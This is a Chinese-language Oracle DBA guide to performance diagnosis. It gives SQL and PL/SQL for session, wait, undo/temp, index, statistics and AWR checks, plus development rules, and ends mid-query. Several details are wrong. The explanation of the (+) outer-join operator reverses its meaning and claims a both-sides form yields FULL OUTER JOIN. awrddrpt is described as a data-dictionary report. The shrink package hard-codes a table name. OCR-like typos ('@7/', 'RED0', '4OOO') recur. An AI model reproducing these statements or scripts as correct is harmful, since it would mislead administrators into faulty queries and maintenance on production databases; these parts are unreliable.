    0 2037 3806  3  3 94  0  0 0  0      0 114512   6700 1897796    0    0    16    84 2148 3758  3  4 93  0  0 0  0      0 114512   6700 1897808    0    0     0     0 2152 4052  3  4 94  0  0 0  0      0 114512   6700 1897808    0    0     0     0 1784 3357  1  2 98  0  0 0  0      0 115272   6724 1897812    0    0     0   160 2202 4116  3  4 93  0  0 0  0      0 116028   6756 1897812    0    0     0   324 1835 3365  2  2 95  1  0 0  0      0 116916   6756 1897812    0    0     0     0 2011 3854  2  4 95  0  0\n\n\n性能视图备份\n-- 考虑备份数据库性能视图（最好是在新建的非生产使用的单独用户下操作，比如 TEST_USER 用户）-- 此外在数据库需要重启时，更应考虑备份这些视图create table diag_session_&amp;yyyymmdd_seq_area nologging asselect *from gv$session;create table diag_session_wait_&amp;yyyymmdd_seq_area nologging asselect *from gv$session_wait;create table diag_process_&amp;yyyymmdd_seq_area nologging asselect *from gv$process;create table diag_sql_&amp;yyyymmdd_seq_area nologging asselect *from gv$sql;create table diag_sqlarea_&amp;yyyymmdd_seq_area nologging asselect *from gv$sqlarea;create table diag_sql_plan_&amp;yyyymmdd_seq_area nologging asselect *from gv$sql_plan; --耗性能create table diag_lock_&amp;yyyymmdd_seq_area nologging asselect *from gv$lock;create table diag_locked_object_&amp;yyyymmdd_seq_area nologging asselect *from gv$locked_object;create table diag_access_&amp;yyyymmdd_seq_area nologging asselect *from gv$access;create table diag_latch_&amp;yyyymmdd_seq_area nologging asselect *from gv$latch;create table diag_latch_children_&amp;yyyymmdd_seq_area nologging asselect *from gv$latch_children;create table diag_Librarycache_&amp;yyyymmdd_seq_area nologging asselect *from gv_$Librarycache;create table diag_rowcache_&amp;yyyymmdd_seq_area nologging asselect *from gv_$rowcache;create table diag_sort_segment_&amp;yyyymmdd_seq_area nologging asselect *from gv$sort_segment;create table diag_sort_usage_&amp;yyyymmdd_seq_area nologging asselect *from gv$sort_usage;create table diag_log_history_&amp;yyyymmdd_seq_area nologging asselect *from gv$log_history;create table diag_log_&amp;yyyymmdd_seq_area nologging asselect *from gv$log;create table diag_logfile_&amp;yyyymmdd_seq_area nologging asselect *from gv$logfile;create table diag_transaction_&amp;yyyymmdd_seq_area nologging asselect *from gv$transaction;create table diag_parameter_&amp;yyyymmdd_seq_area nologging asselect *from gv$parameter;create table diag_session_longops_&amp;yyyymmdd_seq_area nologging asselect *from gv$session_longops;create table diag_bh_&amp;yyyymmdd_seq_area nologging asselect *from gv$bh;create table diag_filestat_&amp;yyyymmdd_seq_area nologging asselect *from gv$filestat;create table diag_segstat_&amp;yyyymmdd_seq_area nologging asselect *from gv$segstat;create table diag_tempstat_&amp;yyyymmdd_seq_area nologging asselect *from gv$tempstat;create table diag_datafile_&amp;yyyymmdd_seq_area nologging asselect *from gv$datafile;create table diag_tempfile_&amp;yyyymmdd_seq_area nologging asselect *from gv$tempfile;create table diag_open_cursors_&amp;yyyymmdd_seq_area nologging asselect *from gv$open_cursors;\n\n\n获取基线当系统觉得有问题时，可以考虑立即取一个断点基线，作为AWR报表的一个断点。exec dbms_workload_repository.create_snapshot();\n\n观察临时表空间和回滚段表空间情况\n-- 查谁占用了undo表空间select r.name                      回滚段名     , rssize / 1024 / 1024 / 1024 &quot;rssize(g)&quot;     , s.sid     , s.serial#     , s.username                  用户名     , s.status     , s.sql_hash_value     , s.sql_address     , s.machine     , s.module     , substr(s.program, 1, 78)    操作程序     , r.usn     , hwmsize / 1024 / 1024 / 1024     , shrinks     , xactsfrom sys.v_$session S   , sys.v_$transaction t   , sys.v_$rollname r   , v$rollstat rswhere t.addr = s.taddr  and t.xidusn = r.usn  and r.usn = rs.usnorder by rssize desc;-- 查谁占用了temp表空间select t.blocks * 16 / 1024 / 1024     , s.username     , s.schemaname     , t.tablespace     , t.segtype     , t.extents     , s.program     , s.osuser     , s.terminal     , s.sid     , s.serial#from v$sort_usage t   , v$session swhere t.session_addr = s.saddr;-- 还可查到具体SQLselect sql.sql_id     , t.blocks * 16 / 1024 / 1024     , s.username     , s.schemaname     , t.tablespace     , t.segtype     , t.extents     , s.program     , s.osuser     , s.terminal     , s.sid     , s.serial#     , sql.sql_textfrom v$sort_usage t   , v$session s   , v$sql sqlwhere t.session_addr = s.saddr  and t.sqladdr = sql.address  and t.sqlhash = sql.hash_value;\n\n动态局部通过主机进程PID查SQL通过主机进程PID查SQL(这个步骤和之前的top命令紧密相连，就是为了直接分析这些耗CPU的进程和哪些SQL有关系)本来可以用如下方法来查，但是系统出现问题时，一般不容易查出来，太慢（有时用 ordered 或者 no_merge 的 HINT 有效，有时无效)\nselect /*+ ordered */    sql_textfrom v$sqltext awhere (a.hash_value, a.address) in      (select decode(sql_hash_value, 0, prev_hash_value, sql_hash_value)            , decode(sql_hash_value, 0, prev_sql_addr, sql_address)       from v$session b       where b.paddr =             (select addr from v$process c where c.spid = &#x27;&amp;pid&#x27;))order by piece asc;\n\n一般采用下面三步（可避免性能问题，返回结果会快）\n-- 1. 获取 addrselect spid     , addr     , t.pga_used_mem     , t.pga_alloc_mem     , t.pga_freeable_mem     , t.pga_max_memfrom v$process twhere spid = &#x27;$pid&#x27;;-- 2. 根据 addr 获取 sql_idselect t.sid     , t.program     , t.machine     , t.logon_time     , t.wait_class     , t.wait_time     , t.seconds_in_wait     , t.event     , t.sql_id     , t.prev_sql_idfrom v$session twhere paddr = &#x27;$addr&#x27;;-- 3. 根据 sql_id 查询具体 SQLselect t.sql_id     , t.sql_text     , t.executions     , t.first_load_time     , t.last_load_time     , t.buffer_gets     , t.rows_processedfrom v$sql twhere sql_id in (&#x27;$sql_id&#x27;);\n\n\n观察当前数据库的版本及等待情况，SQL基本情况。\n-- 等待事件（当前)select t.event, count(*)from v$session tgroup by eventorder by count(*) desc;-- 等待事件（历史汇集）select t.event, t.total_waitsfrom v$system_event torder by total_waits desc;-- 游标使用情况select inst_id, sid, count(*)from gv$open_cursorgroup by inst_id, sidhaving count(*) &gt;= 1000order by count(*) desc;-- PGA占用最多的进程select p.spid     , p.pid     , s.sid     , s.serial#     , s.status     , p.pga_alloc_mem     , s.username     , s.osuser     , s.programfrom v$process p   , v$session swhere s.paddr(+) = p.addrorder by p.pga_alloc_mem desc;-- 登录时间最长的SESSION(同时获取到 spid ,方便在主机层面 ps-ef|grep spid 来查看)select *from (select t.sid           , t2.spid           , t.PROGRAM           , t.status           , t.sql_id           , t.PREV_SQL_ID           , t.event           , t.LOGON_TIME           , trunc(sysdate - logon_time)      from v$session t         , v$process t2      where t.paddr = t2.ADDR        and t.type &lt;&gt; &#x27;BACKGROUND&#x27;      order by logon_time)where rownum &lt; 20;-- 物理读和逻辑较多的5QL-- 逻辑读最多select *from (select sql_id           , sql_text           , s.executions           , s.last_load_time           , s.first_load_time           , s.disk_reads           , s.buffer_gets      from v$sql s      where s.buffer_gets &gt; 300      order by buffer_gets desc)where rownum &lt;= 20;-- 物理读最多select *from (select sql_id           , sql_text           , s.executions           , s.last_load_time           , s.first_load_time           , s.disk_reads           , s.buffer_gets           , s.parse_calls      from v$sql s      where s.disk_reads &gt; 300      order by disk_reads desc)where rownum &lt;= 20;-- 执行次数最多select *from (select sql_id           , sql_text           , s.executions           , s.last_load_time           , s.first_load_time           , s.disk_reads           , s.buffer_gets           , s.parse_calls      from v$sql s      order by s.executions desc)where rownum &lt;= 20;-- 解析次数最多select *from (select sql_id           , sql_text           , s.executions           , s.last_load_time           , s.first_load_time           , s.disk_reads           , s.buffer_gets           , s.parse_calls      from v$sql s      order by s.parse_calls desc)where rownum &lt; 20;-- 求 DISK SORT 严重的 SQLselect sess.username, sql.sql_text, sql.address, sort1.blocksfrom v$session sess   , v$sqlarea sql   , v$sort_usage sort1where sess.serial# = sort1.session_num  and sort1.sqladdr = sql.address  and sort1.sqlhash = sql.hash_value  and sort1.blocks &gt; 200order by sort1.blocks desc;\n\n补充：在 Oracle SQL 中，(+) 符号用于指示外连接（outer join）。除了 (+) 符号之外，Oracle 还支持使用 LEFT OUTER JOIN,RIGHT OUTER JOIN, 和 FULL OUTER JOIN 语法来表达外连接。\nJOIN 的写法这里就省略了。下面说 (+) 的写法：\n\n(+) 符号用于指示外连接，它可以出现在等式的一边或两边。\n如果 (+) 出现在等式的左边，则表示 LEFT OUTER JOIN。\n如果 (+) 出现在等式的右边，则表示 RIGHT OUTER JOIN。\n如果 (+) 出现在等式的两边，则表示 FULL OUTER JOIN。\n\n语法:\nFROM left_table, right_tableWHERE left_table.column (+) = right_table.column\n\n\n语法差异:\n\n使用 LEFT OUTER JOIN, RIGHT OUTER JOIN, 和 FULL OUTER JOIN 语法时，可以使用现代的 ANSI SQL 标准语法。\n使用 (+) 符号时，需要使用旧式的逗号连接语法，并在 WHERE 子句中指定外连接条件。\n\n\n性能:\n\n在大多数情况下，使用现代的外连接语法 (LEFT OUTER JOIN, RIGHT OUTER JOIN, 和 FULL OUTER JOIN) 可能会产生更好的执行计划和性能。\n(+) 符号虽然仍然支持，但在新版本的 Oracle 数据库中可能不再推荐使用。\n\n\n版本兼容性:\n\n确保使用的外连接语法在当前 Oracle 数据库版本中可用。\n\n\n\n\n检查是否有过分提交的语句检查是否有过分提交的语句，关键是得到 sid,代入 V$SESSION 就可知道是什么进程，接下来还可以知道 V$SQL\n-- 提交次数最多的SESSIONselect t1.sid, t1.value, t2.namefrom v$sesstat t1   , v$statname t2--where t2.name like &#x27;%commit%&#x27;where t2.name like &#x27;%user commits?%&#x27; -- 可以只选user commits,其他系统级的先不关心  and t1.STATISTIC# = t2.STATISTIC#  and value &gt;= 10000order by value desc;-- 取得SID既可以代入到v$SESSION和v$SQL中去分析-- 得出SQL_IDselect t.sid     , t.program     , t.machine     , t.logon_time     , t.wait_class     , t.wait_time     , t.seconds_in_wait     , t.event     , t.sql_id     , t.prev_sql_idfrom v$session twhere sid in (&#x27;$sid&#x27;);-- 根据sql id或prev_sql_id代入得到SQLselect t.sql_id     , t.sql_text     , t.executions     , t.first_load_time     , t.last_load_time     , t.buffer_gets     , t.rows_processedfrom v$sql twhere sql_id in (&#x27;$sql_id&#x27;)\n\n\n检查系统使用绑定变量的情况\n-- 查询共享内存占有率select count(*), round(sum(sharable_mem) / 1024 / 1024, 2)from v$db_object_cache a;-- 捕获出需要使用绑定变量的SQL(这里只能适配大多数语句)Drop table t1 purge;create table t1 asselect sql_text, modulefrom v$sqlarea;alter table t1    add sql_text_wo_constants varchar2(1000);CREATE OR REPLACE FUNCTION remove_constants(p_query IN VARCHAR2) RETURN VARCHAR2AS    l_query     LONG;    l_char      VARCHAR2(10);    l_in_quotes BOOLEAN DEFAULT FALSE;BEGIN    FOR i IN 1..LENGTH(p_query)        LOOP            l_char := SUBSTR(p_query, i, 1);            IF (l_char = &#x27;&#x27;&#x27;&#x27;) THEN                IF l_in_quotes THEN                    l_in_quotes := FALSE;                ELSE                    l_in_quotes := TRUE;                    l_query := l_query || &#x27;&#x27;&#x27;#&#x27;;                END IF;            ELSIF NOT l_in_quotes THEN                l_query := l_query || l_char;            END IF;        END LOOP;    -- 替换数字    l_query := TRANSLATE(l_query, &#x27;0123456789&#x27;, &#x27;@@@@@@@@@@&#x27;);    -- 移除多余的 @ 符号    FOR i IN 0..8        LOOP            l_query := REPLACE(l_query, LPAD(&#x27;@&#x27;, 10 - i, &#x27;@&#x27;), &#x27;@&#x27;);            l_query := REPLACE(l_query, LPAD(&#x27;&#x27;, 10 - i, &#x27;&#x27;), &#x27;&#x27;);        END LOOP;    RETURN UPPER(l_query);END;-- 编译函数    ALTER FUNCTION TEST_USER.remove_constants COMPILE;update TEST_USER.t1set sql_text_wo_constants = remove_constants(sql_text);commit;-- 执行完上述动作后，以下SQL语句可以完成未绑定变量语句的统计select sql_text_wo_constants, module, count(*)from t1group by sql_text_wo_constants, modulehaving count(*) &gt; 100order by 3 desc;\n\n静态整体主机静态情况检查\n# 查看磁盘空间使用情况df -h# 主机内存情况cat /proc/meminfo# 主机CPU情况cat /proc/cpuinfo\n\n\n记录下Oracle数据库的所有参数设置情况，并检查是否归档\n-- 版本及所有参数情况-- 开启CRT的日志跟踪-- 版本select *from v$version;-- 所有参数show parameter-- 关闭CRT的日志跟踪，将文件取回-- 其中重点关注的是-- sga pga log_buffer processes open_cursors session_cached_cursors db_recovery_file_dest cluster_database-- SGA, PGA, 日志缓冲区, 进程数, 打开的游标数, 会话缓存的游标数, 数据库恢复文件目的地, 集群数据库设置相关的参数。-- 是否归档archive log list\n\n\n检查数据库表和索引是否存在并行度设在其中的情况\n-- 检查数据库表和索引是否存在并行度设在其中的情况（很多时候有人用parallel建了表或索引，忘记alter table xxx noparallel关闭了)。select t.owner, t.table_name, degreefrom dba_tables twhere t.degree &gt; &#x27;1&#x27;;select t.owner, t.table_name, index_name, degree, statusfrom dba_indexes twhere owner in (&#x27;TEST_USER&#x27;)  and t.degree &gt; &#x27;1&#x27;;-- 有问题就要处理，比如索引有并行，就处理如下：select &#x27;alter index &#x27; || t.owner || &#x27;.&#x27; || index_name || &#x27;noparallel;&#x27;from dba_indexes twhere owner in (&#x27;TEST_USER&#x27;)  and t.degree &gt; &#x27;1&#x27;;\n\n\n检查是否有失效的索引\n-- 普通索引select t.index_name     , t.table_name     , blevel     , t.num_rows     , t.leaf_blocks     , t.distinct_keysfrom dba_indexes twhere status = &#x27;INVALID&#x27;;-- 分区索引select t2.owner     , t1.blevel     , t1.leaf_blocks     , t1.index_name     , t2.table_name     , t1.partition_name     , t1.statusfrom dba_ind_partitions t1   , dba_indexes t2where t1.index_name = t2.index_name  and t1.status = &#x27;UNUSABLE&#x27;  and t2.owner in (&#x27;TEST_USER&#x27;);-- 以下是所有失效对象的检查select &#x27;alter&#x27; ||       decode(object_type, &#x27;PACKAGE BODY&#x27;, &#x27;PACKAGE&#x27;, &#x27;TYPE BODY&#x27;, &#x27;TYPE&#x27;, object_type) || &#x27;&#x27; ||       owner || &#x27;.&#x27; || object_name || &#x27;&#x27; ||       decode(object_type, &#x27;PACKAGE BODY&#x27;, &#x27;compile body&#x27;, &#x27;compile&#x27;) || &#x27;;&#x27;     , t.*from dba_objects twhere status = &#x27;INVALID&#x27;--owner not in (&#x27;PUBLIC&#x27;,&#x27;SYSTEM&#x27;,&#x27;SYS&#x27;)  and owner in (&#x27;TEST_USER&#x27;);\n\n\n检查是否有显著未释放高水平位的表\nselect table_name, blocks, num_rowsfrom user_tableswhere blocks / num_rows &gt;= 0.2  and num_rows is not null  and num_rows &lt;&gt; 0  and blocks &gt;= 10000;-- 这个就可以预测到哪些是高水平位没释放的表。-- 其中blocks&gt;:=10000是因为低于10000的块说明表的体积太小了，释放或不释放无所谓。-- 而 blocks / num_rows &gt;= 1 表示是严重有问题的。-- 而这个 blocks / num_rows &gt;= 0.2 表示至少一个块要装5行数据，如果装不了，那就很奇怪了，值得怀疑了，除非有LONG和CLOB字段或者一堆的VARCHAR2(4OOO)字段。-- 附（可以释放高水平位的脚本，在 Oracle 的 shrink 方法无效时可采纳）：create or replace package pkg_shrink    Authid Current_Useras    /*    功能：将delete后的表降低高水平    */    procedure p_move_tab(p_tab varchar2);    procedure p_cal_bytes(p_status varchar2, p_tab varchar2);    procedure p_rebuid_idx(p_tab varchar2);    procedure p_main(p_table_name varchar2);end pkg_shrink;create or replace package body pkg_shrinkas    v_sql varchar2(4000);    procedure p_cal_bytes(p_status varchar2, p_tab varchar2)    as        v_tab_bytes number;        v_idx_bytes number;        v_str_tab   varchar2(4000);        v_str_idx   varchar2(4000);    begin        select sum(bytes) / 1024 / 1024 into v_tab_bytes from user_segments where segment_name = upper(p_tab);        select sum(bytes) / 1024 / 1024        into v_idx_bytes        from user_segments        where segment_name IN (SELECT INDEX_NAME                               FROM USER_INDEXES                               WHERE TABLE_NAME = upper(p_tab));        v_str_tab := p_status || &#x27;表&#x27; || p_tab || &#x27;的大小为&#x27; || v_tab_bytes || &#x27;M&#x27;;        if v_idx_bytes is null then            v_str_idx := p_status || &#x27;无索引&#x27;;        else            v_str_idx := p_status || &#x27;索引的大小为&#x27; || v_idx_bytes || &#x27;M&#x27;;        end if;        dbms_output.put_line(v_str_tab || &#x27;;&#x27; || v_str_idx);    end p_cal_bytes;    procedure p_move_tab(p_tab varchar2)    as        V_IF_PART_TAB NUMBER;    begin        SELECT COUNT(*) INTO V_IF_PART_TAB FROM user_part_tables WHERE TABLE_NAME = upper(P_TAB);        IF V_IF_PART_TAB = 0 THEN --非分区表            v_sql := &#x27;alter table &#x27; || p_tab || &#x27; move&#x27;; -- 完成表的MOVE动作，从而做到降低高水平位，不过也带来了索引的失效！            DBMS_OUTPUT.put_line(v_sql);            execute immediate v_sql;        ELSE -- 分区表            for i in (SELECT * from USER_TAB_PARTITIONS WHERE TABLE_NAME = upper(p_tab))                loop                    v_sql := &#x27;alter table &#x27; || p_tab || &#x27; move partition &#x27; || i.partition_name; -- 完成分区表的MOVE动作，同样带来了索引失效！                    DBMS_OUTPUT.put_line(v_sql);                    execute immediate v_Sql;                end loop;        END IF;    end p_move_tab;    procedure p_rebuid_idx(p_tab varchar2)    as        V_NORMAL_IDX NUMBER;        V_PART_IDX   NUMBER;    begin        SELECT COUNT(*)        INTO V_NORMAL_IDX        FROM user_indexes        where table_name = &#x27;PART_TAB&#x27;          AND INDEX_NAME            NOT IN (SELECT INDEX_NAME FROM user_part_indexes);        IF V_NORMAL_IDX &gt;= 1 THEN -- 普通索引            for i in (select *                      from user_indexes                      where table_name = upper(p_tab)                        AND INDEX_NAME                          NOT IN (SELECT INDEX_NAME FROM user_part_indexes))                loop                    v_sql := &#x27;alter index &#x27; || i.index_name || &#x27; rebuild&#x27;; -- 将失效的普通索引重建                    DBMS_OUTPUT.put_line(v_sql);                    execute immediate v_sql;                end loop;        END IF;        SELECT COUNT(*) INTO V_PART_IDX FROM user_part_indexes WHERE TABLE_NAME = &#x27;PART_TAB&#x27;;        IF V_PART_IDX &gt;= 1 THEN -- 分区索引            for i in (SELECT *                      from User_Ind_Partitions                      WHERE index_name in (select index_name                                           from user_part_indexes                                           where table_name = upper(p_tab)))                loop                    v_sql := &#x27;alter index &#x27; || i.index_name || &#x27; rebuild partition &#x27; || i.partition_name; -- 将失效分区索引重建                    DBMS_OUTPUT.put_line(v_sql);                    execute immediate v_Sql;                end loop;        END IF;    end p_rebuid_idx;    procedure p_main(p_table_name varchar2)    as    begin        for i in (select *                  from (SELECT SUBSTR(s, INSTR(s, &#x27;,&#x27;, 1, ROWNUM) + 1,                                      INSTR(s, &#x27;,&#x27;, 1, ROWNUM + 1) - INSTR(s, &#x27;,&#x27;, 1, ROWNUM) - 1) AS TYPE_ID                        FROM (SELECT &#x27;,&#x27; || p_table_name || &#x27;,&#x27; AS s FROM DUAL)                        CONNECT BY ROWNUM &lt;= 100)                  WHERE type_id IS NOT NULL            )            loop                -- 在外面SELECT再套一层是必须的，否则只会循环一次。另外type_id IS NOT NULL是必须的，否则会多循环                DBMS_OUTPUT.put_line(&#x27;当前处理的表为&#x27; || i.TYPE_ID);                p_cal_bytes(&#x27;未降低高水平位前&#x27;, i.type_id);                p_move_tab(i.type_id);                p_rebuid_idx(I.TYPE_ID);                p_cal_bytes(&#x27;降低高水平位后&#x27;, i.type_id);            end loop;    end p_main;end pkg_shrink;-- 编译    alter package PKG_SHRINK compile reuse settings-- 执行BEGIN    pkg_shrink.p_main(&#x27;TABLE_NAME&#x27;);END;\n\n\n检查统计信息\n自动统计信息收集情况\n-- 检查哪些对象的统计信息不够新，或者从未统计过（注意，让未统计过的在前面，即nulls first)。-- 检查统计信息是否被收集select t.JOB_NAME, t.PROGRAM_NAME, t.state, t.enabledfrom dba_scheduler_jobs twhere job_name = &#x27;GATHER_STATS_JOB&#x27;;-- 检查哪些未被收集或者很久没收集select owner     , table_name     , t.last_analyzed     , t.num_rows     , t.blocks     , t.object_typefrom dba_tab_statistics twhere owner in (&#x27;TEST_USER&#x27;)  and (t.last_analyzed is null or t.last_analyzed &lt; sysdate - 14)order by t.last_analyzed nulls first;-- 查看数量select count(*)from dba_tab_statistics twhere owner in (&#x27;TEST_USER&#x27;)  and (t.last_analyzed is null or t.last_analyzed &lt; sysdate - 14);\n\n全局临时表情况\n-- 检查全局临时表有没有被收集统计信息select owner     , table_name     , t.last_analyzed     , t.num_rows     , t.blocksfrom dba_tables twhere t.temporary = &#x27;Y&#x27;  and owner in (&#x27;TEST_USER&#x27;);-- 相应的处理措施BEGIN    DBMS_STATS.DELETE_TABLE_STATS(&#x27;TEST_USER&#x27;, &#x27;RN_IDENTIFICATION_BATCH&#x27;); -- 删除统计信息    DBMS_STATS.LOCK_TABLE_STATS(&#x27;TEST_USER&#x27;, &#x27;RN_IDENTIFICATION_BATCH&#x27;); -- 不收集统计信息END;\n\n\nawr addm ash awrddrpt awrsqrpt等方式观察数据库\nexec dbms_workload_repository.create_snapshot();@?/rdbms/admin/awrrpt.sql@?/rdbms/admin/addmrpt.sql@7/rdbms/admin/ashrpt.sql@?/rdbms/admin/awrddrpt.sql@?/rdbms/admin/awrsqrpt.sql-- 注意：一般要考虑统计出问题的时间段的报表，顺序一般是 awr -&gt; addm -&gt; ash -&gt; awrdd -&gt; awrsq\n\n这些命令和脚本用于生成和分析 Oracle 自动工作负载仓库 (AWR) 的报告。\n\nexec dbms_workload_repository.create_snapshot();:\n该命令用于创建一个新的 AWR 快照。AWR 快照包含了数据库在某一时间段内的性能统计数据，这些数据可用于后续的性能分析。\n创建快照有助于记录当前数据库的工作负载状况，并为后续的性能对比提供基准。\n\n\n@?/rdbms/admin/awrrpt.sql:\n此命令用于执行 AWR 报告生成脚本 awrrpt.sql。该脚本会生成一份详细的 AWR 报告，这份报告包含了数据库在指定时间段内的性能指标和统计数据。\nAWR 报告是性能分析的基础，可以了解数据库的整体性能状况。\n\n\n@?/rdbms/admin/addmrpt.sql:\n此命令用于执行 ADDM (自动数据库诊断监控器) 报告生成脚本 addmrpt.sql。该脚本会生成一份基于 AWR 数据的 ADDM 报告。\nADDM 报告提供了更深入的性能分析，包括性能问题的根本原因分析和优化建议。\n\n\n@7/rdbms/admin/ashrpt.sql:\n此命令用于执行 ASH (自动共享历史) 报告生成脚本 ashrpt.sql。该脚本会生成一份基于 ASH 数据的报告。\nASH 报告提供了关于会话活动的详细信息，包括等待事件、SQL 执行等，这对于诊断性能瓶颈非常有用。\n\n\n@?/rdbms/admin/awrddrpt.sql:\n此命令用于执行 AWR 数据字典报告生成脚本 awrddrpt.sql。该脚本会生成一份关于 AWR 数据字典的报告。\nAWR 数据字典报告提供了关于 AWR 表的详细信息，这有助于理解 AWR 数据的结构。\n\n\n@?/rdbms/admin/awrsqrpt.sql:\n此命令用于执行 AWR SQL 报告生成脚本 awrsqrpt.sql。该脚本会生成一份关于 SQL 语句执行性能的报告。\nAWR SQL 报告提供了 SQL 语句的性能统计数据，包括执行次数、CPU 时间等，这对于优化 SQL 语句的性能非常有用。\n\n\n\n\n获取数据库告警和监听日志\nlsnrctl status # 可获取监听的路径\n\nshow parameter ump -- 可获取告警日志的路径-- 文件很大的情况下，可以考虑 tail -n 50000 alert* &gt; alert.log 的方式获取最近5万条记录-- 监听也是类似 tail -n 50000 list* &gt; listener.log\n\n\n检查日志大小设置情况\n-- 一般情况下，建议单个RED0设置为5GB大，如果发现告警日志切换频繁，则应该立即调整select inst_id, group#, memberfrom gv$logfile;select group#, bytes, statusfrom v$log;\n\n\n检查最大的对象是哪些、表空间的使用情况及回收站情况\n-- 用户的权限情况select *from dba_role_privswhere grantee = &#x27;TEST_USER&#x27;;-- 最大的前20个对象（然后再进一步COUNT(*)统计其记录数）select *from (select owner           , segment_name           , segment_type           , sum(bytes) / 1024 / 1024 / 1024 object_size      from DBA_segments      WHERE owner in (&#x27;TEST_USER&#x27;)      group by owner, segment_name, segment_type      order by object_size desc)where rownum &lt; 50;-- 表空间使用情况select a.tablespace_name                                    &quot;表空间名&quot;     , a.total_space                                        &quot;总空间(g)&quot;     , nvl(b.free_space, 0)                                 &quot;剩余空间(g)&quot;     , a.total_space - nvl(b.free_space, 0)                 &quot;使用空间(g)&quot;     , trunc(nvl(b.free_space, 0) / a.total_space * 100, 2) &quot;剩余百分比%&quot;from (select tablespace_name           , trunc(sum(bytes) / 1024 / 1024 / 1024, 2) total_space      from dba_data_files      group by tablespace_name) a   , (select tablespace_name           , trunc(sum(bytes / 1024 / 1024 / 1024), 2) free_space      from dba_free_space      group by tablespace_name) bwhere a.tablespace_name = b.tablespace_name(+)order by 5;-- 整个用户有多大（比如 TEST_USER 用户）select sum(bytes) / 1024 / 1024 / 1024 &quot;G&quot;from dba_segmentswhere owner = &#x27;TEST_USER&#x27;;-- 回收站情况select SUM(BYTES) / 1024 / 1024 / 1024from DBA_SEGMENTSWHERE owner = &#x27;TEST_USER&#x27;  AND SEGMENT_NAME LIKE &#x27;BINS%&#x27;;-- 分区最多的前20个对象（先知道表就可以大概了解了，索引可以后续再观察）select *from (select table_owner, table_name, count(*) cnt      from dba_tab_partitions      WHERE table_owner in (&#x27;TEST_USER&#x27;)      group by table_owner, table_name      order by cnt desc)where rownum &lt; 20;\n\n静态局部检查有哪些函数索引或者位图索引\n-- 检查有哪些函数索引或者位图索引（大多数情况下开发人员对这两类索引是使用不当的，所以需要捞出来确认一下)select t.owner     , t.index_name     , t.index_type     , t.status     , t.blevel     , t.leaf_blocksfrom dba_indexes twhere index_type in (&#x27;BITMAP&#x27;, &#x27;FUNCTION-BASED NORMAL&#x27;)  and owner in (&#x27;TEST_USER&#x27;);\n\n\n检查CACHE小于20的序列\n-- 检查序CACHE小于20的序列的情况（一般情况下可将其增至1000左右，序列默认的20太小）select t.sequence_name     , t.cache_size     , &#x27;alter sequence &#x27; || t.sequence_owner || &#x27;.&#x27; || t.sequence_name || &#x27; cache 1000;&#x27;from dba_sequences twhere sequence_owner in (&#x27;TEST_USER&#x27;)  AND CACHE_SIZE &lt; 20;\n\n\n分析需要跟踪的表和索引的情况\n查看表大小情况\n-- 记录的大小select count(*)from TANBLE_NAME;-- 物理的大小select segment_name, sum(bytes) / 1024 / 1024from user_segmentswhere segment_name in (&#x27;TANBLE_NAME&#x27;)group by segment_name;\n\n查看表结构情况\n-- 查看表信息select t.table_name     , t.num_rows     , t.blocks     -- t.empty_blocks, --统计信息不收集这个字段，所以不需要这个字段了     , t.degree     , t.last_analyzed     , t.temporary     , t.partitioned     , t.pct_free     , t.tablespace_namefrom user_tables twhere table_name in (&#x27;TABLE_NAME&#x27;);-- 查看分区表相关信息-- 查看分区表相关信息(user_part_tables记录分区的表的信息，user_tab_partitions记录表的分区的信息)-- 以下了解这些表的分区是什么类型的，有多少个分区select t.table_name     , t.partitioning_type     , t.partition_countfrom user_part_tables twhere table_name in (&#x27;TABLE_NAME&#x27;);-- 以下了解这些表以什么列作为分区Select name     , object_type     , column_namefrom user_part_key_columnswhere name in (&#x27;TABLE_NAME&#x27;);-- 以下了解这些表的分区范围是多少SELECT table_name, partition_name, high_value, tablespace_nameFROM user_tab_partitions twhere table_name in (&#x27;TABLE_NAME&#x27;)order by table_name, t.partition_position;\n\n每张表对应有多少个索引，物理多大\nselect t2.table_name     , t1.segment_name     , sum(t1.bytes) / 1024 / 1024from user_segments t1   , user_indexes t2where t1.segment_name = t2.index_name  and t1.segment_type like &#x27;%INDEX%&#x27;  and t2.table_name in (&#x27;T1&#x27;)group by t2.table_name, t1.segment_nameorder by table_name;-- 结构情况（高度、重复度、并行度、叶子高度、聚合因子、记录数、状态、最近分析时间...）select t.table_name     , t.index_name     , t.num_rows     , t.index_type     , t.status     , t.clustering_factor     , t.blevel     , t.distinct_keys     , t.leaf_blocks     , t.uniqueness     , t.degree     , t.last_analyzedfrom user_indexes twhere table_name in (&#x27;TABLE_NAME&#x27;);\n\n查看索引列信息\n-- 以下可以查出来的是索引的列是什么（无论分区表和非分区表都可以查出）select t.table_name, t.index_name, t.column_name, t.column_position, t.DESCENDfrom user_ind_columns twhere table_name in (&#x27;TABLE_NAME&#x27;)order by table_name, index_name, column_position;-- 以下查出的都是分区索引select table_name, index_name, partitioning_type, partition_countfrom user_part_indexeswhere table_name in (&#x27;TABLE_NAME&#x27;)order by table_name, index_name;select index_name, partition_name, status, blevel, leaf_blocksfrom user_ind_partitionswhere index_name in      (select index_name       from user_indexes       where table_name in (&#x27;TABLE_NAME&#x27;));\n\n开发规范 让开发者驾轻就熟sql 编写规范单条SQL长度不宜超过100行\n-- 判断过长 sqlselect sql_id, count(*)from v$sqltextgroup by sql_idhaving count(*) &gt;= 100order by count(*) desc;\n\n\nSQL子查询嵌套不宜超过3层一般来说，子查询嵌套如果超过3层，容易导致$QL语句的解析过于复杂，导致产生错误的执行计划。此外子查询嵌套过多，一般适宜分解成更简单的多条SQL。\n\nSQL表关联需考虑连接和限制条件的索引\ndrop table t purge;create table t asselect *from v$sql_plan;-- 使用Nested Loops Join但是未用到索引的，比较可疑select *from twhere sql_id not in (select sql_id                     from t                     where sql_id in (select sql_id from t where operation = &#x27;NESTED LOOPS&#x27;)                       and (operation like &#x27;%INDEX%&#x27; or object_owner like &#x27;%SYS%&#x27;))  and sql_id in (select sql_id from t where operation = &#x27;NESTED LOOPS&#x27;);\n\n\n尽量避免HNT在代码中出现\n-- 找出非SYS用户用HINT的所有SQL来分析select sql_text     , sql_id     , module     , t.service     , first_load_time     , last_load_time     , executions     , servicefrom v$sql twhere sql_text like &#x27;%/*+%&#x27;  and t.SERVICE not like &#x27;SYS$%&#x27;;\n\n\n同一SQL模块避免出现大量相似之处这种SQL写法一般比较可疑，一般可以优化，比如 WITH 子句等等，所以出现后需引起注意。\n\n用到并行度需谨慎\n表和索引属性设置并行找出被设置成并行属性的表和索引，并修正\nselect t.owner, t.table_name, degreefrom dba_tables twhere t.degree 